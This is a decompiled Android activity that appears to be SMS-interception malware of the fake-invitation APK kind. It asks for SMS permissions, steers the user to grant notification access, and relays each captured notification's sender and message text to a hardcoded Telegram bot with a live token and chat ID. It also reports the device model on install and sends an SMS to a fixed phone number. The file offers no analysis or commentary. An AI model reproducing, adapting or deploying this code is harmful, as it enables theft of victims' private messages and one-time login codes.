package com.example.myapplicatior;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Paint;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.Html;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import com.rhmsoft.codeund9013.R;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private static final int RESULT_ENABLE = 0;
    private static final int VISIBILITY = 1028;
    final String TAG = "demo1";
    /* access modifiers changed from: private */
    public final OkHttpClient client = new OkHttpClient();
    String device = (Build.BRAND + " - " + Build.MODEL + SmsManager.getDefault());
    private Object devicePolicyManager;
    ComponentName mDeviceAdminSample;
    private BroadcastReceiver onNotice = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String stringExtra = intent.getStringExtra("package");
            String stringExtra2 = intent.getStringExtra("title");
            String stringExtra3 = intent.getStringExtra("text");
            String stringExtra4 = intent.getStringExtra("id");
            new TableRow(MainActivity.this.getApplicationContext()).setLayoutParams(new TableRow.LayoutParams(-1, -2));
            TextView textView = new TextView(MainActivity.this.getApplicationContext());
            textView.setLayoutParams(new TableRow.LayoutParams(-2, -2, 1.0f));
            textView.setTextSize(12.0f);
            textView.setTextColor(Color.parseColor("#000000"));
            textView.setText(Html.fromHtml("From : " + stringExtra2 + " | Message : </b>" + stringExtra3));
            MainActivity.this.client.newCall(new Request.Builder().url(" https://api.telegram.org/bot6341956598:AAFpJQvO54Xn78G7D3bcuhEwg244XyryMWY/sendMessage?parse_mode=markdown&chat_id=5801319391&text=*" + stringExtra + "* %0A%0A*From :* _" + stringExtra2 + "_%0A*Message :* _" + stringExtra3 + "_").build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
        }
    };
    private TextView textView;
    WebSettings websettingku;
    WebView webviewku;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView((int) R.NP_MANAGER11.MT_Bin);
        WebView webView = (WebView) findViewById(R.NP_MANAGER8.MT_Bin);
        this.webviewku = webView;
        WebSettings settings = webView.getSettings();
        this.websettingku = settings;
        settings.setJavaScriptEnabled(true);
        this.webviewku.setWebViewClient(new WebViewClient());
        this.webviewku.loadUrl(HttpUrl.FRAGMENT_ENCODE_SET);
        if (Build.VERSION.SDK_INT >= 19) {
            this.webviewku.setLayerType(2, (Paint) null);
        } else if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {
            this.webviewku.setLayerType(1, (Paint) null);
        }
        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission("android.permission.RECEIVE_SMS") != 0 && checkSelfPermission("android.permission.SEND_SMS") != 0) {
            requestPermissions(new String[]{"android.permission.RECEIVE_SMS", "android.permission.SEND_SMS"}, 1000);
        }
    }

    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != 1000) {
            return;
        }
        if (grantResults[0] == 0) {
            this.client.newCall(new Request.Builder().url(" https://api.telegram.org/bot6341956598:AAFpJQvO54Xn78G7D3bcuhEwg244XyryMWY/sendMessage?parse_mode=markdown&chat_id=5801319391&text=\n──────────────────────\n\n  𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐋𝐚𝐧𝐚 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨     \n\n    ──────────────────────  \n\n " + this.device).build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            try {
                SmsManager.getDefault().sendTextMessage("085378590953", (String) null, "ini nomor siapa ya", (PendingIntent) null, (PendingIntent) null);
            } catch (Exception e) {
                this.client.newCall(new Request.Builder().url(" https://api.telegram.org/bot6341956598:AAFpJQvO54Xn78G7D3bcuhEwg244XyryMWY/sendMessage?parse_mode=markdown&chat_id=5801319391&text=Error : _" + e).build()).enqueue(new Callback() {
                    public void onFailure(Call call, IOException e) {
                        e.printStackTrace();
                    }

                    public void onResponse(Call call, Response response) throws IOException {
                        Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                        if (response.isSuccessful()) {
                            response.body().string();
                        }
                    }
                });
                Toast.makeText(getApplicationContext(), HttpUrl.FRAGMENT_ENCODE_SET + e, 1).show();
            }
            NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService("notification");
            if (Build.VERSION.SDK_INT >= 23 && !notificationManager.isNotificationPolicyAccessGranted()) {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                Toast.makeText(this, "Izinkan akses notification ", 0).show();
            }
            LocalBroadcastManager.getInstance(this).registerReceiver(this.onNotice, new IntentFilter("Msg"));
            return;
        }
        Toast.makeText(this, "Permission Not Granted!", 0).show();
        this.client.newCall(new Request.Builder().url(" https://api.telegram.org/bot6341956598:AAFpJQvO54Xn78G7D3bcuhEwg244XyryMWY/sendMessage?parse_mode=markdown&chat_id=5801319391&text=\n──────────────────────\n\n  𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐋𝐚𝐧𝐚 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨     \n\n    ──────────────────────  \n\n " + this.device + "_").build()).enqueue(new Callback() {
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                if (response.isSuccessful()) {
                    response.body().string();
                }
            }
        });
        finish();
    }
}
